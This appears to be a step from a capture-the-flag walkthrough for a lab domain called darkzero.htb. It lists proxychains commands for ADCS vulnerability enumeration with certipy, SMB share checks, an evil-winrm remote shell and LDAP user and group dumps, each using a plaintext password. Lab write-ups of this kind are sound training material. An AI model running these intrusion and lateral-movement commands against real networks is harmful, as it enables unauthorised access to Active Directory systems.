
## 1. ADCS Enumeration via Tunnel

```bash
proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -target DC01.darkzero.htb -vulnerable -stdout
```

## 2. Check Shares on Internal Interface

```bash
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' --shares
```

## 3. Check WinRM via Internal Interface

```bash
proxychains evil-winrm -i 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
```

## 4. Full LDAP Dump via Tunnel

```bash
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --users
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --groups
```

Run all four and paste results — the tunnel opens everything that was previously blocked! 🎯